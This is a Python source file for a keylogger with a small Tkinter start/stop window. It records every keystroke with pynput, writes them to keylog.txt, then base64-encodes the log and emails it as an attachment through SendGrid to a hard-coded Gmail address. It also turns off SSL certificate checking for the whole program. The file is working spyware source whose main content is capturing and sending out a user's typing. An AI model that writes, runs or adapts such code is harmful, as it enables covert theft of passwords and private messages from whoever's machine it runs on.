import tkinter as tk
import base64
import pynput
import sendgrid
import os
import ssl
from pynput.keyboard import Key, Listener
from sendgrid.helpers.mail import Mail, Attachment, FileContent, FileName, FileType, Disposition

# Create an unverified SSL context
ssl._create_default_https_context = ssl._create_unverified_context

# File to log the typed keys
log_file = "keylog.txt"

# SendGrid API configuration
SENDGRID_API_KEY = '*'
SENDGRID_FROM_EMAIL = 'testingxmyxcases@gmail.com'
SENDGRID_TO_EMAIL = 'testingxmyxcases@gmail.com'
SENDGRID_SUBJECT = "Log File"
SENDGRID_BODY = "Here is the log file with the recorded keystrokes."

# Function to write the keys to the log file handling the special cases
def write_to_file(key):
    with open(log_file, "a") as file:
        key_data = str(key).replace("'", "")
        if key == Key.space:
            file.write(' ')
        elif key == Key.enter:
            file.write('\n')
        elif key == Key.backspace:
            file.write(" [BACKSPACE] ")
        elif key == Key.tab:
            file.write(" [TAB] ")
        elif key == Key.ctrl:
            file.write(" [CTRL] ")
        elif key == Key.cmd: 
            file.write(" [CMD] ")
        elif key == Key.caps_lock:
            file.write(" [CAPSLOCK] ")
        elif key == Key.alt:
            file.write(" [ALT] ")
        elif key == Key.esc:
            file.write(" [ESC] ")
        else:
            file.write(key_data)

# Function called when a key is pressed
def on_press(key):
    write_to_file(key)

# Function called when a key is released
def on_release(key):
    if key == Key.esc:
        # Stop listener if ESC is pressed
        send_email_with_sendgrid()
        return False

# Function to start keylogger
def start_keylogger():
    global listener
    listener = Listener(on_press=on_press, on_release=on_release)
    listener.start()

# Function to stop keylogger
def stop_keylogger():
    global listener
    if listener is not None:
        listener.stop()

# Function to send email using SendGrid
def send_email_with_sendgrid():
    sg = sendgrid.SendGridAPIClient(api_key=SENDGRID_API_KEY)
    
    message = Mail(
        from_email=SENDGRID_FROM_EMAIL,
        to_emails=SENDGRID_TO_EMAIL,
        subject=SENDGRID_SUBJECT,
        plain_text_content=SENDGRID_BODY
    )

    # Attach the log file
    with open(log_file, 'rb') as f:
        file_data = f.read()
    encoded_file = base64.b64encode(file_data).decode()

    attachment = Attachment(
        FileContent(encoded_file),
        FileName('keylog.txt'),
        FileType('text/plain'),
        Disposition('attachment')
    )
    message.attachment = attachment

    try:
        response = sg.send(message)
        print(f"Email sent successfully! Status code: {response.status_code}")
    except Exception as e:
        print(f"Failed to send email: {e}")

def create_gui():
    window = tk.Tk()
    window.title("Keylogger")
    
    start_button = tk.Button(window, text="Start Keylogger", command=start_keylogger)
    start_button.pack(pady=10)
    
    stop_button = tk.Button(window, text="Stop Keylogger and Send Email", command=lambda: [stop_keylogger(), send_email_with_sendgrid()])
    stop_button.pack(pady=10)
    
    # Run the window
    window.mainloop()

# Run the GUI
create_gui()
